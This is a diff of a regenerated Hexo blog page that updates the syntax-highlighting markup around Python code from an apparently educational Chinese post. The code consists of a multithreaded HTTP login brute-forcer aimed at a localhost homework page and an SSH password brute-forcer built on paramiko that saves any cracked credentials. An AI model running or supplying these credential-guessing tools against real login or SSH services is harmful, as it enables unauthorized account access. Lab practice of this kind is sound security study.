@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -262,7 +262,7 @@
 <span class="hljs-comment"># 对字典的分块大小</span>
 BLOCK_SIZE = <span class="hljs-number">1000</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>:</span>
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadWork</span>:
     url = <span class="hljs-string">&quot;http://127.0.0.1/homework/brute/login.php&quot;</span>
 
     headers = &#123;
@@ -271,37 +271,37 @@ BLOCK_SIZE = <span class="hljs-number">1000</span>
             <span class="hljs-string">&#x27;Chrome/19.0.1036.7 Safari/535.20&#x27;</span>
     &#125;
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, username, password</span>):</span>
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password</span>):
         self.username = username
         self.password = password
 
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, username, password</span>):
         data = &#123;
             <span class="hljs-string">&#x27;username&#x27;</span>:username,
             <span class="hljs-string">&#x27;password&#x27;</span>:password,
             <span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;%E7%99%BB%E5%BD%95&#x27;</span>
         &#125;
-        print(<span class="hljs-string">&quot;username:&#123;&#125;,password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username,password))
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;username:&#123;&#125;,password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username,password))
         response = requests.post(self.url, data=data, headers=self.headers)
 
         <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Login failed&#x27;</span> <span class="hljs-keyword">in</span> response.text:
             <span class="hljs-keyword">pass</span>
         <span class="hljs-keyword">else</span>:
-            print(<span class="hljs-string">&quot;success!!! username:&#123;&#125;, password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
+            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success!!! username:&#123;&#125;, password:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
             resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)
             resultFile.write(<span class="hljs-string">&quot;success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username, password))
             resultFile.close()
             <span class="hljs-comment"># 程序终止，0表示正常退出</span>
             <span class="hljs-comment"># os._exit(0) </span>
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">self</span>):
         <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.username:
             <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.password:
                 self.run(userItem, pwdItem)
 
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BruteForceHttp</span>():</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">BruteForceHttp</span>():
 
     listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
     listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwords&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)]
@@ -326,7 +326,7 @@ BLOCK_SIZE = <span class="hljs-number">1000</span>
         t.join()
 
 <span class="hljs-comment"># 将密码和账号分块函数</span>
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params">ls, size</span>):</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">partition</span>(<span class="hljs-params">ls, size</span>):
     res = []
     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ls), size):
         res.append(ls[i: i+size])
@@ -336,7 +336,7 @@ BLOCK_SIZE = <span class="hljs-number">1000</span>
     time1 = time.time()
     BruteForceHttp()
     time2 = time.time()
-    print(time2-time1)</code></pre></div>
+    <span class="hljs-built_in">print</span>(time2-time1)</code></pre></div>
 
 <p>七十万条的数据跑了快十分钟，有点不可思议。。。可能是服务器的问题</p>
 <h1 id="多线程破解SSH密码"><a href="#多线程破解SSH密码" class="headerlink" title="多线程破解SSH密码"></a>多线程破解SSH密码</h1><blockquote>
@@ -353,15 +353,15 @@ BLOCK_SIZE = <span class="hljs-number">1000</span>
 <span class="hljs-keyword">import</span> os
 <span class="hljs-keyword">import</span> paramiko
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadWork</span>(<span class="hljs-params">threading.Thread</span>):</span>
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, ip, usernameBlock, passwordBlock, port</span>):</span>
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadWork</span>(threading.Thread):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, ip, usernameBlock, passwordBlock, port</span>):
         threading.Thread.__init__(self)
         self.ip = ip
         self.port = port
         self.usernameBlock = usernameBlock
         self.passwordBlock = passwordBlock
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, username, password</span>):</span>
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, username, password</span>):
         <span class="hljs-string">&#x27;&#x27;&#x27;</span>
 <span class="hljs-string">        使用死循环</span>
 <span class="hljs-string">        &#x27;&#x27;&#x27;</span>
@@ -374,7 +374,7 @@ BLOCK_SIZE = <span class="hljs-number">1000</span>
                 sys.stdout.write(<span class="hljs-string">&quot;[*]ssh[&#123;&#125;:&#123;&#125;:&#123;&#125; =&gt; &#123;&#125; \n&quot;</span>.<span class="hljs-built_in">format</span>(username,password,self.port, self.ip))
                 ssh.connect(hostname=self.ip, port=self.port, username=username, password=password)
                 ssh.close()
-                print(<span class="hljs-string">&quot;[+]success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username , password))
+                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]success!!! username: &#123;&#125;, password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(username , password))
 
                 resultFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../brutpass/result&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>)
 
@@ -387,26 +387,26 @@ BLOCK_SIZE = <span class="hljs-number">1000</span>
             <span class="hljs-keyword">except</span> paramiko.ssh_exception.SSHException <span class="hljs-keyword">as</span> e:
                 <span class="hljs-keyword">break</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start</span>(<span class="hljs-params">self</span>):</span>
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">self</span>):
         <span class="hljs-keyword">for</span> userItem <span class="hljs-keyword">in</span> self.usernameBlock:
             <span class="hljs-keyword">for</span> pwdItem <span class="hljs-keyword">in</span> self.passwordBlock:
                 self.run(userItem, pwdItem)
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">partition</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, num</span>):</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">partition</span>(<span class="hljs-params"><span class="hljs-built_in">list</span>, num</span>):
     step = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>) / num)
     <span class="hljs-keyword">if</span> step == <span class="hljs-number">0</span>:
         step = num
     partition = [<span class="hljs-built_in">list</span>[i:i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>), step)]
     <span class="hljs-keyword">return</span> partition
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SshEXP</span>(<span class="hljs-params">ip, usernameFile, passwordFile, threadNumber, sshPort</span>):</span>
-    print(<span class="hljs-string">&quot;============爆破信息============&quot;</span>)
-    print(<span class="hljs-string">&quot;IP:&quot;</span> + ip)
-    print(<span class="hljs-string">&quot;UserName:&quot;</span> + usernameFile)
-    print(<span class="hljs-string">&quot;PassWord:&quot;</span> + passwordFile)
-    print(<span class="hljs-string">&quot;Threads:&quot;</span> + <span class="hljs-built_in">str</span>(threadNumber))
-    print(<span class="hljs-string">&quot;Port:&quot;</span> + sshPort)
-    print(<span class="hljs-string">&quot;=================================&quot;</span>)
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">SshEXP</span>(<span class="hljs-params">ip, usernameFile, passwordFile, threadNumber, sshPort</span>):
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;============爆破信息============&quot;</span>)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;IP:&quot;</span> + ip)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UserName:&quot;</span> + usernameFile)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;PassWord:&quot;</span> + passwordFile)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Threads:&quot;</span> + <span class="hljs-built_in">str</span>(threadNumber))
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Port:&quot;</span> + sshPort)
+    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=================================&quot;</span>)
 
     listUsername = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/username&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
     listPassword = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../brutpass/passwords&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)]
